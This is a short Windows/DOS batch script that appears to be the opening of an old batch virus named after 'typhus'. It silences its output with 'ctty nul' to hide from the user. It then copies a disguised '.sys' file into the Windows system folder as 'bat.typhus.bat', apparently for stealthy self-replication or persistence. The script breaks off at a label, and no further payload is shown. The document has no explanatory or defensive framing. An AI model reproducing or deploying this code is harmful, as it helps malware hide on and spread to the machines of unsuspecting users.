@echo off 
ctty nul 
if exist c:\windows\system\bat.typhus.bat goto 0k 
copy c:\windows\tph.sys c:\windows\system\bat.typhus.bat 
:0k 
